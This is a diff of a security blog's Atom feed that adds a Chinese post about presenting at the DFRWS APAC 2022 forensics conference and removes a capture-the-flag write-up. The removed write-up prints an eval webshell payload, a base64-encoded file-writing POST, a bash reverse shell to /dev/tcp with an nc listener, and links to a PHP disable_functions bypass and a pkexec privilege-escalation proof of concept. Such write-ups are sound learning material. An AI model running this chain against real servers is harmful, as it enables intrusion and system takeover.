@@ -6,7 +6,7 @@
   <link href="http://websec.space/atom.xml" rel="self"/>
   
   <link href="http://websec.space/"/>
-  <updated>2022-09-12T18:40:09.867Z</updated>
+  <updated>2022-09-29T11:40:51.988Z</updated>
   <id>http://websec.space/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="http://websec.space/2022/09/29/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8F%82%E5%8A%A0%E9%A1%B6%E4%BC%9A%E7%9A%84%E6%84%9F%E5%8F%97%E4%B9%8BDFRWS/"/>
+    <id>http://websec.space/2022/09/29/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8F%82%E5%8A%A0%E9%A1%B6%E4%BC%9A%E7%9A%84%E6%84%9F%E5%8F%97%E4%B9%8BDFRWS/</id>
+    <published>2022-09-29T13:17:54.131Z</published>
+    <updated>2022-09-29T11:40:51.988Z</updated>
+    
+    <content type="html"><![CDATA[<img src="https://xinyuan-1308133958.cos.ap-beijing.myqcloud.com/image-20220929183211394.png" alt="image-20220929183211394" style="zoom: 50%;" /><h1 id="第一次参加顶会之DFRWS"><a href="#第一次参加顶会之DFRWS" class="headerlink" title="第一次参加顶会之DFRWS"></a>第一次参加顶会之DFRWS</h1><h2 id="DFRWS"><a href="#DFRWS" class="headerlink" title="DFRWS"></a>DFRWS</h2><p>DFRWS is a non-profit, volunteer organization dedicated to bringing together everyone with a legitimate interest in digital forensics to address the emerging challenges of our field. DFRWS organizes digital forensic conferences, challenges, and international collaboration to help drive the direction of research and development.</p><p>或许没有其他领域的会议那么出名，但是在电子取证领域有一定声誉</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>参加DFRWS需要在指定投递材料，从准备给顶会发材料，到完成我们总共花了三个月左右的时间，在此也十分感谢对我们提供过帮助的小伙伴。</p><h2 id="等待通知"><a href="#等待通知" class="headerlink" title="等待通知"></a>等待通知</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Your paper has been accepted for presentation at the DFRWS APAC 2022.</span><br><span class="line"></span><br><span class="line">In order to present your work at the Conference, at least one of the presenter should have a full registration with DFRWS APAC 2022. </span><br></pre></td></tr></table></figure><h2 id="准备演讲稿和pre-record"><a href="#准备演讲稿和pre-record" class="headerlink" title="准备演讲稿和pre-record"></a>准备演讲稿和pre-record</h2><p>需要准备一份演讲稿和一份预录制的视频和PPT，主办方会有审核</p><h2 id="会议期间"><a href="#会议期间" class="headerlink" title="会议期间"></a>会议期间</h2><p>需要准备演讲，此处英语比较重要，也可以是非常重要，需要提前联系主持人去greenroom里面做一个测试设备</p><h2 id="一点点挑战的感想"><a href="#一点点挑战的感想" class="headerlink" title="一点点挑战的感想"></a>一点点挑战的感想</h2><p>​        去投这个会议从一开始就是持着一个试试的态度，还记得在干这个的时候写了那篇闲聊《挑战，还是挑战》，这次离我上次搞暗网的研究已经整整一年的时间了，期间虽然在不停打CTF技术有很大进步，但是对于搞科研一窍不通，在此mrnull和css0k在这里面起到了很大的作用，不知道有几个晚上，我把大家叫到一起说今晚上咱们通宵吧，可能一个晚上就有很大的进度，这时候老师也给了很大的帮助，下面附一张凌晨的工大照片。</p><p>​        <img src="https://xinyuan-1308133958.cos.ap-beijing.myqcloud.com/image-20220929184041988.png" alt="image-20220929184041988" style="zoom: 25%;" /></p><p>​        从开始做项目到现在，从一开始找方向，到后面确定去做暗网流量的分析，中间废了很大的工夫，而且在我们虽然对暗网比较了解，对有些技术也不太确定，而且我们在做研究时，更容易去做一个产品，在做研究时就在想让这个研究能最后落地。到系统大致完成到产出论文，可能只用了一周的时间，期间不知道熬了多少个大夜。</p><p>​        同时英语真的是很大障碍，第一次觉得英语有点完全不够用，在英语会议的第一天，有个印度老师的演讲，很流畅但是完完全全听不懂在说什么，更别说交流了，看到线上大家能用英语很流畅的表达，真的十分令人羡慕。第二天能够听懂大概了，更多的这是一次十分宝贵的锻炼机会，很多投过再多论文，可能也没有一次在世界上做presentation的机会，我深知此次机会的来之不易，但迫于无奈，即使能听懂问的什么，我的表达也就是几个词汇连成一个陈述句，可能这就是哑巴英语吧。</p><p>​        在安全领域继续走下去，也继续能够去分享一些技术，英语确实更加重要。</p><p>议程附在这里</p><img src="https://xinyuan-1308133958.cos.ap-beijing.myqcloud.com/image-20220929184535809.png" alt="image-20220929184535809" style="zoom: 67%;" /><img src="https://xinyuan-1308133958.cos.ap-beijing.myqcloud.com/image-20220929182804285.png" alt="image-20220929182804285" style="zoom:67%;" /><img src="https://xinyuan-1308133958.cos.ap-beijing.myqcloud.com/image-20220929184602799.png" alt="image-20220929184602799" style="zoom: 67%;" />]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;img src=&quot;https://xinyuan-1308133958.cos.ap-beijing.myqcloud.com/image-20220929183211394.png&quot; alt=&quot;image-20220929183211394&quot; style=&quot;zoom: 50%</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>Java动态代理</title>
@@ -470,30 +490,6 @@
       
       
     <summary type="html">&lt;h1 id=&quot;ctfshow-php的特性&quot;&gt;&lt;a href=&quot;#ctfshow-php的特性&quot; class=&quot;headerlink&quot; title=&quot;ctfshow php的特性&quot;&gt;&lt;/a&gt;ctfshow php的特性&lt;/h1&gt;&lt;h2 id=&quot;web89&quot;&gt;&lt;a href=&quot;#</summary>
-      
-    
-    
-    
-    <category term="wp" scheme="http://websec.space/categories/wp/"/>
-    
-    
-    <category term="wp" scheme="http://websec.space/tags/wp/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>VNCTF InterestingPHP</title>
-    <link href="http://websec.space/2022/02/14/[VNCTF%20InterestingPHP]/"/>
-    <id>http://websec.space/2022/02/14/[VNCTF%20InterestingPHP]/</id>
-    <published>2022-02-13T16:00:00.000Z</published>
-    <updated>2022-02-13T16:08:21.092Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="VNCTF-InterestingPHP"><a href="#VNCTF-InterestingPHP" class="headerlink" title="[VNCTF InterestingPHP]"></a>[VNCTF InterestingPHP]</h1><p>最近做PHP题目比较多，比赛当天这题思考比较多，但还是没出，今天看了官方wp记录一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); @eval($_GET[&#x27;exp&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>代码越简单，躲在暗处的禁用越多，果然system被ban了，phpinfo()都被ban了</p><p>先查看当前目录下的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(pos(localeconv())));</span><br><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; 1.php [3] =&gt; index.php [4] =&gt; secret.rdb )</span><br></pre></td></tr></table></figure><p>拿到后直接highlight_file又没有被ban</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(&#x27;secret.rdb&#x27;);</span><br><span class="line">REDIS0008�    redis-ver4.0.9�</span><br><span class="line">redis-bits�@�ctime³��a�used-mem��aof-preamble���sercetye_w4nt_a_gir1fri3nd��nR�K��S</span><br></pre></td></tr></table></figure><p>开启了redis，估计是得用redis打。</p><p>但是还用var_dump(scandir(‘/‘))不给看，我又想能不能open_basedir，但用uaf打不通，直接返回500。</p><p>就这样浪费一点时间，走了一段弯路。</p><p>看redis打，就看内网开放了甚么端口。但system被ban，让我做题很被动。这也可能是最后没出的主要原因。。。</p><p>试了好多方法，也连上了蚁剑试了，刚才看官方的wp，发现ban了蚁剑的函数，果然。这里给出官方的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?exp=eval(file_put_contents(&quot;1.php&quot;,base64_decode($_POST[&#x27;a&#x27;])));</span><br><span class="line">POST:</span><br><span class="line">a=PD9waHAKaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pOwojIFBvcnQgc2Nhbgpmb3IoJGk9MDskaTw2NTUzNTskaS</span><br><span class="line">srKSB7CiAgJHQ9c3RyZWFtX3NvY2tldF9zZXJ2ZXIoInRjcDovLzAuMC4wLjA6Ii4kaSwkZWUsJGVlMik7CiAgaW</span><br><span class="line">YoJGVlMiA9PT0gIkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiKSB7CiAgICB2YXJfZHVtcCgkaSk7CiAgfQp9Cg</span><br></pre></td></tr></table></figure><blockquote><p>返回</p><p>int(80) int(8888)</p></blockquote><p>忽然看到群里有大佬发了自己的wp啊</p><p>我觉得很有意思就去尝试一下</p><blockquote><p>尝试 bypass 的 exp：<a href="https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php%EF%BC%8C%E5%85%B6%E4%B8%AD">https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php，其中</a> <code>fwrite</code> 被禁了，改成 <code>fputs</code></p></blockquote><p>我也尝试用这个exp打了一下</p><p>果然可以，如何尝试getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[c 端]</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1&quot;</span><br><span class="line">[s 端]</span><br><span class="line">nc -l 7777</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/28250c9bfcbc4016a93dd67b2b251de1.png" alt="img"></p><p>成功getshell泪目了，呜呜呜，就是没有访问的权限所以准备提权。</p><p><a href="https://github.com/arthepsy/CVE-2021-4034">arthepsy/CVE-2021-4034: PoC for PwnKit: Local Privilege Escalation Vulnerability in polkit’s pkexec (CVE-2021-4034) (github.com)</a></p><p><img src="https://img-blog.csdnimg.cn/04515c6fe5d3468d975f755bd171b2d3.png" alt="img"></p><p>顺着大佬的思路摸过来的，tql，开阔了玩web的思路。</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;VNCTF-InterestingPHP&quot;&gt;&lt;a href=&quot;#VNCTF-InterestingPHP&quot; class=&quot;headerlink&quot; title=&quot;[VNCTF InterestingPHP]&quot;&gt;&lt;/a&gt;[VNCTF InterestingPHP]&lt;/</summary>
       
     
     
